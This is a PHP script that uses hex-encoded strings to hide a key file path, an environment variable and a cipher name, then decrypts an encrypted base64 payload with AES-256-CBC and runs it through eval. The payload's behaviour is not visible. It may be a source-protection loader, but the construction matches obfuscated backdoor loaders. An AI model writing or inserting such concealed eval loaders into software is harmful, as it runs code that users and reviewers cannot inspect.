<?php

$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('bBX8FDqPr9dzQWL2lFSqlQ==');

$c=base64_decode(

'8cy1vPDBazSc2l31S2cKdzdjSLxxFUTKenhuJxkgalltJKOKl1Uz7KmwItZc6gHbrNAXEmjS7Iyk' .
'Vurl6IbVY5h0zhD2ayhUJP4SpL9XO9R9dtM2b9WLieNoO8NVIR2pzv2HiuXwlI1Rhr5laSSi+Iuz' .
'nlNPtSztQqksGCSfBNj0y2GwVEnxqVh405XFCCI9zKQBMcK3xYVa0Eo+bybFXMvbu0HUaFfhkVQ0' .
'0UH00XI899ZnsHmETozkO92onQuEuYJaFELtgPT9dYh+cA/RTXbWStvuL1b0tB2RVIDvrcrFn5f2' .
'lGUvxqdpvetHif/JJNq3QxIZbnbABUmGk9FtwarBiEKakysLXvhQ84kuGzg/Suf8NongiYDchplH' .
'fDk694HvB9lkzNVvG1UHcHiWhcqNb03HVctR7Oq5hJ1ToHjLznJG7Igg9vnv+YGGjbzI3oJmVHSE' .
'7FsFq7rTY7WhYGMzyCgxNu2z4jiGKlr2IjO2RBTtBiwUOLqOsRBrR8ZL9xld1GbY82XkenOFCm3w' .
'sjIoeZL0y/1SbLB/jgHbn6Kd6D0bKRnxgIzlwDBWe+P1oV/o6LojMEE4YSKOuWb1yrkAR4gDzzsT' .
'8xKjJmx3xKx1EL1NlR/EB/Ccjqv3P4vMlREv0ZVtXk087G+F7RIsEhTXrpA3Ta5eKo8zs7OSUCj8' .
'iN6Ka/qTTy1s+mCze37bj694//tdVqcuCTXtH5zu1lpBHB/PQ+HUVDMUPIfkUAzYCnWAmVTjXfz3' .
'F941eezKCU2ItE1ns42WghfSR/DECQqP2w60lxftT5vWp9uZxrEemkxeTct4OFHxUGVRfKxo2tOH' .
'LoHwd4vRI76+oavgSwtYLPZL2Rwnjh6Z0PhbqU1dY6tZPWLW/TXr5lV1fcvg4nAhoSr3GD44Ubo+' .
'AAMzeKT60wPtVmUQ9EapD2dpkr+wdrGVIgomAGrrRL93xtA+0epqIMOOpbH4XJAi5h0hkwMzrMO5' .
'o8elMNxx2KzhU0dTl++0QxR/kxcqEbHCTAKUj7nXPfKYRUos0wvQojjhCGmQFlTkKMhsq1ioPChL' .
'dsBgem/m20+RDK+/hqNTmYuRZrwW9Fw0Wb4+5ZZcechtpeZGtS3s57nN+EBc2b5L1VFidj042TC1' .
'wnbZj6Rmd8fA1l3rOuVMzMn4TdkRe3Jjp5/oeHhjaBJZx1en/O0q1STSSQJskF2YQRvQN7pgDOdJ' .
'AV/3XkZK5q9mqYDm2dl+KU3gm14eJSkA/5xO4EQQ+MOQ+CvAxb2QoqqXFWUCAD+B6tcCvM3dGX1Q' .
'LsnrRnps4AGW4oKmB6kWx46Ypr6DwU64TERpTpmduzysLhcZJDK/fItUarUCUmDZV9zXXbqH64lE' .
'3NGlcx9N+mjPESmvk4Jwm15S4LaB+I7KXef47ZJsVwKByGY5veyNgmtos1J2BJ4EdYwf4arYxzPP' .
'ekRpiZNbl+J/q3ooWRc031Z8sXMlYkvOr9qUNTAa0Ztb0Q/BmtSWevntS0OF4mBQVdSpMwF3K2bA' .
'KmTGD66fg8vi5hkf0/bzlmfxMZAbC27PI0cMzBULf/N6W4z5qpkq2ktKro+mXcvK29n19v+ZNpA8' .
'yRpzGs3X1kAKxbHNZjJIfnQbeS+6xS8XNel5wBvWpFPb+n2p+htfPvZSRYmdB+J0FneYOo0vEjYn' .
'StlshkiHqSVj5/BKrZghphzqWRdEMiw/m8df8J87T3fUEyi2HZs2zDcorR+BDGI5+UQdVup3XigM' .
'36KMNNvopqqEpy6yTWAWtlcfF6tTy9Iv3/6brhU+iKywQI7d9LvQPEXKLxwmvX00htTl0ITHdmZ6' .
'HCYHCkoECB//rH9lLI+JmRz4n+UPNGdy80yDI1K2mxv2NLLRM25G6YokP3zELZfUJdsLGj6Okggz' .
'qpCAyYFHNqG/0vO2eHugVsgERelxVFsCXx3NZp2KWMYE123+sFRuQTSNY2olIyL6HZap7zU8wi3a' .
'/HjCBgR4EnhpWn/P/j9LcgO7MNlk5MCP6uSlur+UkEm97yinNoPAH2EXaJ+GJpIWs0TTWs9gpV1R' .
'8HeIbBbbDyEjwVqu4m0Xb4seLYTISHtzPNPPfwHfpdmlES8C+s4MDJwPtAafZgiEcpc1xeBBPTP8' .
'tTE7IFxk0eg6NDveeR28PkaW9MFv0HRf6VdhzDEPuyW3A1xCgkglVT6ZM32fEmPe6xXpIAJCuFnn' .
'GOnEJ0eS9PzuJ6sJnl7K9OYcrL5FCXEIGK7W8Vb8Iue+am55Dk3TQLrCh4zZdab4diEci1/oGuTS' .
'Ga9N0HZqF2r4uG3omqaM3+XPT460iHVEsSSPnY2zBBMOiYXvbZ+g3RRsd5+o1QBmc5GlWMvGxhdG' .
'Kn9EeoJUdlPAyGXzZcgYZBNSdAnjf9QuyA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval('?>'.$d);

